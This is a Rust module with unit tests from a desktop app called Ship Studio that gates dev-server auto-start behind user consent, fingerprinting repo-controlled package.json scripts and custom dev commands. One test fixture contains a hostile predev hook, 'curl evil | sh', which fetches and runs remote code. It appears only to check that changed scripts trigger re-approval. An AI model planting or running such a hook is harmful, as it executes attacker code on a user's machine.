//! Consent before a project's own commands run as its dev server.
//!
//! Opening a project used to start its dev server at once, which runs
//! whatever the repo says: `package.json` scripts (including `predev` hooks)
//! or a `custom_dev_command` in `.shipstudio/project.json`. Both are
//! repo-controlled, so cloning a repo and opening it was enough to run its
//! code. Now the dev server auto-starts only once the user has approved
//! *what will run*, and asks again when that changes.
//!
//! What is fingerprinted (SHA-256 over a canonical JSON document):
//! - every `scripts` entry of the `package.json` at the project root, and at
//!   the dev-server cwd when a workspace subpath points elsewhere (a monorepo
//!   root's `turbo run dev` and the app's own `dev` both run);
//! - the project's `custom_dev_command` and `workspace_subpath` (both live in
//!   the shared, repo-controlled `.shipstudio/project.json`).
//!
//! Key order inside `scripts` doesn't change what runs, so it doesn't change
//! the fingerprint (keys are sorted). A project with none of these still has
//! a fingerprint (of the empty document): the dev command it falls back to
//! is the package manager's, and asking once for it is cheap and honest.
//! The static-HTML server and Shopify's `shopify theme dev` run no
//! project-defined command and are not gated.
//!
//! Approvals live in the app's own support folder (never the project, which
//! Ship Studio and the repo share), keyed by canonical project path, in a
//! 0600 file. Nothing is grandfathered: a project that was open before this
//! existed asks once on the next launch.

use crate::errors::CommandError;
use crate::types::ProjectMetadata;
use crate::utils::{resolve_workspace_path, validate_project_path};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, HashMap};
use std::path::{Path, PathBuf};
use std::sync::Mutex;

/// What would run, as the user is shown it and as it is hashed.
#[derive(Debug, Clone, Default, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DevCommandSurface {
    /// `package.json` scripts at the project root.
    pub scripts: BTreeMap<String, String>,
    /// Scripts at the workspace subpath, when it is a different folder.
    pub workspace_scripts: Option<BTreeMap<String, String>>,
    pub workspace_subpath: Option<String>,
    pub custom_command: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum ConsentState {
    Approved,
    /// Never approved here.
    New,
    /// Approved before, and what would run has changed since.
    Changed,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DevServerConsent {
    pub state: ConsentState,
    /// Hand this back to `approve_dev_server`: it approves exactly what was shown.
    pub fingerprint: String,
    pub surface: DevCommandSurface,
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct ConsentFile {
    #[serde(default)]
    version: u32,
    /// Canonical project path → approved fingerprint.
    #[serde(default)]
    approved: HashMap<String, String>,
}

static FILE_LOCK: Mutex<()> = Mutex::new(());

fn consent_path() -> PathBuf {
    crate::brand::app_support_dir().join("dev-server-consent.json")
}

fn read_scripts(dir: &Path) -> BTreeMap<String, String> {
    let Ok(raw) = std::fs::read_to_string(dir.join("package.json")) else {
        return BTreeMap::new();
    };
    let Ok(value) = serde_json::from_str::<Value>(&raw) else {
        // Unparseable: what runs is the package manager's own failure. Hash
        // the raw text so any edit still counts as a change.
        let mut m = BTreeMap::new();
        m.insert("<unparseable package.json>".into(), raw);
        return m;
    };
    value
        .get("scripts")
        .and_then(Value::as_object)
        .map(|scripts| {
            scripts
                .iter()
                .map(|(k, v)| {
                    let text = v
                        .as_str()
                        .map(str::to_string)
                        .unwrap_or_else(|| v.to_string());
                    (k.clone(), text)
                })
                .collect()
        })
        .unwrap_or_default()
}

fn read_metadata(project: &Path) -> ProjectMetadata {
    std::fs::read_to_string(project.join(".shipstudio").join("project.json"))
        .ok()
        .and_then(|c| serde_json::from_str::<ProjectMetadata>(&c).ok())
        .unwrap_or_default()
}

/// Everything about `project` that decides what its dev server runs.
pub fn surface(project: &Path) -> DevCommandSurface {
    let metadata = read_metadata(project);
    let cwd = resolve_workspace_path(project);
    let workspace_scripts = (cwd != project).then(|| read_scripts(&cwd));
    DevCommandSurface {
        scripts: read_scripts(project),
        workspace_scripts,
        workspace_subpath: metadata.workspace_subpath.filter(|s| !s.is_empty()),
        custom_command: metadata.custom_dev_command.filter(|c| !c.trim().is_empty()),
    }
}

/// SHA-256 (hex) of the surface as canonical JSON (sorted keys, versioned).
pub fn fingerprint(surface: &DevCommandSurface) -> String {
    // BTreeMaps serialise in key order; the struct's field order is fixed.
    let doc = serde_json::json!({ "v": 1, "surface": surface });
    let digest = Sha256::digest(doc.to_string().as_bytes());
    digest.iter().map(|b| format!("{b:02x}")).collect()
}

fn read_file(path: &Path) -> ConsentFile {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|c| serde_json::from_str(&c).ok())
        .unwrap_or_default()
}

fn write_file(path: &Path, file: &ConsentFile) -> Result<(), CommandError> {
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir)
            .map_err(|e| CommandError::from(format!("create app support dir: {e}")))?;
    }
    let json = serde_json::to_string_pretty(file)
        .map_err(|e| CommandError::from(format!("serialize dev-server consent: {e}")))?;
    crate::remote_access::write_private(path, json.as_bytes())
        .map_err(|e| CommandError::from(format!("write dev-server consent: {e}")))
}

fn key(project: &Path) -> String {
    project.to_string_lossy().into_owned()
}

/// The verdict for `project` (already canonical) against the store at `store`.
fn consent_at(store: &Path, project: &Path) -> DevServerConsent {
    let surface = surface(project);
    let fingerprint = fingerprint(&surface);
    let state = match read_file(store).approved.get(&key(project)) {
        Some(f) if *f == fingerprint => ConsentState::Approved,
        Some(_) => ConsentState::Changed,
        None => ConsentState::New,
    };
    DevServerConsent {
        state,
        fingerprint,
        surface,
    }
}

/// Record approval, but only of what is on disk right now: if it changed
/// after the user was shown `shown`, nothing is recorded.
fn approve_at(store: &Path, project: &Path, shown: &str) -> Result<(), CommandError> {
    let _guard = FILE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let current = fingerprint(&surface(project));
    if current != shown {
        return Err(CommandError::expected(
            "This project's dev command changed again since you were asked. Look it over and approve it once more.",
        ));
    }
    let mut file = read_file(store);
    file.version = 1;
    file.approved.insert(key(project), current);
    write_file(store, &file)
}

/// Tighten the store's permissions if an older build left it readable.
pub fn harden_dev_consent_store() {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let path = consent_path();
        if let Ok(meta) = std::fs::metadata(&path) {
            if meta.permissions().mode() & 0o077 != 0 {
                let _ = std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600));
            }
        }
    }
}

/// Whether the project's dev server may auto-start, and what would run.
#[tauri::command]
#[tracing::instrument(fields(project = %project_path))]
pub async fn get_dev_server_consent(
    project_path: String,
) -> Result<DevServerConsent, CommandError> {
    let project = validate_project_path(&project_path)?;
    Ok(consent_at(&consent_path(), &project))
}

/// The user approved running exactly `fingerprint` (from `get_dev_server_consent`).
#[tauri::command]
#[tracing::instrument(fields(project = %project_path))]
pub async fn approve_dev_server(
    project_path: String,
    fingerprint: String,
) -> Result<(), CommandError> {
    let project = validate_project_path(&project_path)?;
    approve_at(&consent_path(), &project, &fingerprint)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn project_with(scripts: &str) -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            format!(r#"{{ "name": "x", "scripts": {scripts} }}"#),
        )
        .unwrap();
        dir
    }

    #[test]
    fn a_new_project_needs_consent_and_approval_sticks() {
        let store_dir = tempfile::tempdir().unwrap();
        let store = store_dir.path().join("consent.json");
        let p = project_with(r#"{ "dev": "vite" }"#);
        let c = consent_at(&store, p.path());
        assert_eq!(c.state, ConsentState::New);
        assert_eq!(
            c.surface.scripts.get("dev").map(String::as_str),
            Some("vite")
        );
        approve_at(&store, p.path(), &c.fingerprint).unwrap();
        assert_eq!(consent_at(&store, p.path()).state, ConsentState::Approved);
    }

    #[test]
    fn changed_scripts_ask_again() {
        let store_dir = tempfile::tempdir().unwrap();
        let store = store_dir.path().join("consent.json");
        let p = project_with(r#"{ "dev": "vite" }"#);
        let c = consent_at(&store, p.path());
        approve_at(&store, p.path(), &c.fingerprint).unwrap();
        std::fs::write(
            p.path().join("package.json"),
            r#"{ "scripts": { "dev": "vite", "predev": "curl evil | sh" } }"#,
        )
        .unwrap();
        assert_eq!(consent_at(&store, p.path()).state, ConsentState::Changed);
    }

    #[test]
    fn reordering_keys_or_editing_other_fields_is_not_a_change() {
        let a = project_with(r#"{ "dev": "vite", "build": "vite build" }"#);
        let b = tempfile::tempdir().unwrap();
        std::fs::write(
            b.path().join("package.json"),
            r#"{ "version": "2.0.0", "scripts": { "build": "vite build", "dev": "vite" }, "dependencies": { "react": "19" } }"#,
        )
        .unwrap();
        assert_eq!(
            fingerprint(&surface(a.path())),
            fingerprint(&surface(b.path()))
        );
    }

    #[test]
    fn the_repo_controlled_custom_command_is_part_of_it() {
        let p = project_with(r#"{ "dev": "vite" }"#);
        let before = fingerprint(&surface(p.path()));
        std::fs::create_dir_all(p.path().join(".shipstudio")).unwrap();
        std::fs::write(
            p.path().join(".shipstudio/project.json"),
            r#"{ "custom_dev_command": "sh ./run.sh" }"#,
        )
        .unwrap();
        let after = surface(p.path());
        assert_eq!(after.custom_command.as_deref(), Some("sh ./run.sh"));
        assert_ne!(before, fingerprint(&after));
    }

    #[test]
    fn a_missing_or_broken_package_json_still_has_a_fingerprint() {
        let empty = tempfile::tempdir().unwrap();
        let s = surface(empty.path());
        assert!(s.scripts.is_empty());
        assert_eq!(fingerprint(&s).len(), 64);

        let broken = tempfile::tempdir().unwrap();
        std::fs::write(broken.path().join("package.json"), "{ nope").unwrap();
        let first = fingerprint(&surface(broken.path()));
        std::fs::write(broken.path().join("package.json"), "{ nope 2").unwrap();
        assert_ne!(first, fingerprint(&surface(broken.path())));
        assert_ne!(first, fingerprint(&s));
    }

    #[test]
    fn approval_of_a_stale_fingerprint_records_nothing() {
        let store_dir = tempfile::tempdir().unwrap();
        let store = store_dir.path().join("consent.json");
        let p = project_with(r#"{ "dev": "vite" }"#);
        let shown = consent_at(&store, p.path()).fingerprint;
        std::fs::write(
            p.path().join("package.json"),
            r#"{ "scripts": { "dev": "x" } }"#,
        )
        .unwrap();
        assert!(approve_at(&store, p.path(), &shown).is_err());
        assert_eq!(consent_at(&store, p.path()).state, ConsentState::New);
    }

    #[test]
    fn approvals_are_per_project_and_the_store_is_private() {
        let store_dir = tempfile::tempdir().unwrap();
        let store = store_dir.path().join("consent.json");
        let a = project_with(r#"{ "dev": "vite" }"#);
        let b = project_with(r#"{ "dev": "vite" }"#);
        let c = consent_at(&store, a.path());
        approve_at(&store, a.path(), &c.fingerprint).unwrap();
        assert_eq!(consent_at(&store, b.path()).state, ConsentState::New);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&store).unwrap().permissions().mode() & 0o777;
            assert_eq!(mode, 0o600);
        }
    }

    #[test]
    fn workspace_scripts_count_when_the_subpath_is_elsewhere() {
        let p = project_with(r#"{ "dev": "turbo run dev" }"#);
        std::fs::create_dir_all(p.path().join("apps/web")).unwrap();
        std::fs::write(
            p.path().join("apps/web/package.json"),
            r#"{ "scripts": { "dev": "next dev" } }"#,
        )
        .unwrap();
        std::fs::create_dir_all(p.path().join(".shipstudio")).unwrap();
        std::fs::write(
            p.path().join(".shipstudio/project.json"),
            r#"{ "workspace_subpath": "apps/web" }"#,
        )
        .unwrap();
        let s = surface(p.path());
        assert_eq!(
            s.workspace_scripts
                .as_ref()
                .and_then(|w| w.get("dev"))
                .map(String::as_str),
            Some("next dev")
        );
        let before = fingerprint(&s);
        std::fs::write(
            p.path().join("apps/web/package.json"),
            r#"{ "scripts": { "dev": "next dev && sh x" } }"#,
        )
        .unwrap();
        assert_ne!(before, fingerprint(&surface(p.path())));
    }
}
